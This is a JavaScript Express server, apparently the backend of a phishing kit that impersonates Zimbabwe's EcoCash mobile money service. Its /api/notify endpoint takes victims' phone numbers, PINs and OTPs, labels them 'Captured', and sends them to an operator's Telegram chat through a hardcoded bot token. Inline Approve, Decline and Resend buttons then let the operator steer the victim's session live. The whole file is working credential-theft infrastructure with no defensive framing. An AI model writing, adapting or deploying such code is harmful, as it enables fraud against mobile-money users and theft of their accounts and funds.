/**
 * EcoCash Zimbabwe — Backend
 * Telegram webhook + inline approve/decline buttons + session polling.
 */

const express = require('express');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3005;

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8834604760:AAHnFWeTawysGPNs6dnqvbOYquhC4cxhs1w';
const TELEGRAM_CHAT_ID   = process.env.TELEGRAM_CHAT_ID   || '8294270663';
const TELEGRAM_API       = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
const PUBLIC_URL         = process.env.PUBLIC_URL || 'https://ecopay-online.onrender.com';
const SESSION_TTL_MS     = 60 * 60 * 1000; // 60 minutes

app.use(express.json({ limit: '1mb' }));
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, '..'), { extensions: ['html'] }));

// ---------- Session store (in-memory) ----------
const sessions = new Map();

function createSession(stage, meta) {
  const id = 's_' + Date.now().toString(36) + Math.random().toString(36).slice(2, 8);
  const now = Date.now();
  sessions.set(id, {
    id, stage, meta,
    status: 'pending',
    createdAt: now,
    expiresAt: now + SESSION_TTL_MS,
  });
  return sessions.get(id);
}

function getSession(id) {
  const s = sessions.get(id);
  if (!s) return null;
  if (Date.now() > s.expiresAt && s.status === 'pending') {
    s.status = 'expired';
  }
  return s;
}

// Cleanup expired sessions every 5 min
setInterval(() => {
  const now = Date.now();
  for (const [id, s] of sessions) {
    if (now > s.expiresAt + 60000) sessions.delete(id);
  }
}, 5 * 60 * 1000);

// ---------- Telegram helpers ----------
async function sendTelegramMessage(text, replyMarkup) {
  const body = {
    chat_id: TELEGRAM_CHAT_ID,
    text,
    parse_mode: 'Markdown',
  };
  if (replyMarkup) body.reply_markup = replyMarkup;

  const res = await fetch(`${TELEGRAM_API}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body),
  });
  return res.json();
}

async function answerCallback(callbackQueryId, text) {
  await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ callback_query_id: callbackQueryId, text }),
  });
}

async function editMessageReplyMarkup(chatId, messageId, replyMarkup) {
  await fetch(`${TELEGRAM_API}/editMessageReplyMarkup`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chatId,
      message_id: messageId,
      reply_markup: replyMarkup || { inline_keyboard: [] },
    }),
  });
}

// ---------- POST /api/notify ----------
// Body: { stage: 'pin' | 'otp', phone, pinOrOtp, receipt }
app.post('/api/notify', async (req, res) => {
  try {
    const { stage, phone, pinOrOtp, receipt } = req.body || {};
    if (!stage || !['pin', 'otp'].includes(stage)) {
      return res.status(400).json({ ok: false, error: 'Invalid stage' });
    }

    const session = createSession(stage, { phone, receipt });

    const label = stage === 'pin' ? '🔐 PIN Captured' : '📩 OTP Captured';
    const secretLabel = stage === 'pin' ? 'PIN' : 'OTP';

    const text =
      `${label}\n` +
      `━━━━━━━━━━━━━━━\n` +
      `🧾 *Ref:* ${receipt?.trackingNumber || '—'}\n` +
      `👤 *Recipient:* ${receipt?.accountName || '—'}\n` +
      `📱 *Phone:* ${phone || '—'}\n` +
      `🔑 *${secretLabel}:* \`${pinOrOtp || '—'}\`\n` +
      `💳 *Service:* ${receipt?.modeOfPayment || '—'}\n` +
      `💰 *Amount:* ${receipt?.currency || ''} ${receipt?.amount || '—'}\n` +
      `🕒 ${new Date().toLocaleString('en-GB', { timeZone: 'Africa/Harare' })} CAT\n` +
      `\n_Session: ${session.id}_`;

    let buttons;
    if (stage === 'pin') {
      buttons = {
        inline_keyboard: [[
          { text: '✅ Approve', callback_data: `approve:${session.id}` },
          { text: '❌ Decline', callback_data: `decline:${session.id}` },
        ]],
      };
    } else {
      buttons = {
        inline_keyboard: [[
          { text: '✅ Approve', callback_data: `approve:${session.id}` },
          { text: '🔁 Resend',  callback_data: `resend:${session.id}`  },
        ]],
      };
    }

    const tg = await sendTelegramMessage(text, buttons);
    if (!tg.ok) {
      console.error('Telegram send failed:', tg);
      return res.status(502).json({ ok: false, error: tg.description });
    }

    return res.json({ ok: true, sessionId: session.id });
  } catch (err) {
    console.error('Notify error:', err);
    return res.status(500).json({ ok: false, error: err.message });
  }
});

// ---------- GET /api/status/:id ----------
app.get('/api/status/:id', (req, res) => {
  const s = getSession(req.params.id);
  if (!s) return res.status(404).json({ ok: false, error: 'Session not found' });
  return res.json({
    ok: true,
    status: s.status,
    stage: s.stage,
  });
});

// ---------- POST /api/telegram-webhook ----------
app.post('/api/telegram-webhook', async (req, res) => {
  try {
    const update = req.body || {};
    const cq = update.callback_query;

    if (cq && cq.data) {
      const [action, sessionId] = cq.data.split(':');
      const s = getSession(sessionId);

      if (!s) {
        await answerCallback(cq.id, 'Session expired');
        return res.json({ ok: true });
      }

      if (s.status !== 'pending') {
        await answerCallback(cq.id, `Already ${s.status}`);
        return res.json({ ok: true });
      }

      if (action === 'approve') {
        s.status = 'approved';
        await answerCallback(cq.id, '✅ Approved');
      } else if (action === 'decline') {
        s.status = 'declined';
        await answerCallback(cq.id, '❌ Declined');
      } else if (action === 'resend') {
        s.status = 'resend';
        await answerCallback(cq.id, '🔁 Resend requested');
      } else {
        await answerCallback(cq.id, 'Unknown action');
      }

      // Remove inline buttons on the original message
      if (cq.message && cq.message.message_id) {
        await editMessageReplyMarkup(cq.message.chat.id, cq.message.message_id, null);
      }
    }

    return res.json({ ok: true });
  } catch (err) {
    console.error('Webhook error:', err);
    return res.status(500).json({ ok: false, error: err.message });
  }
});

// ---------- Health ----------
app.get('/health', (_req, res) => res.json({ ok: true, ts: Date.now() }));

// ---------- Auto-register webhook on startup ----------
async function registerWebhook() {
  try {
    const url = `${PUBLIC_URL}/api/telegram-webhook`;
    const res = await fetch(`${TELEGRAM_API}/setWebhook?url=${encodeURIComponent(url)}`);
    const data = await res.json();
    console.log('setWebhook:', data);
  } catch (e) {
    console.error('setWebhook failed:', e);
  }
}

app.listen(PORT, async () => {
  console.log(`EcoCash server running on port ${PORT}`);
  await registerWebhook();
});
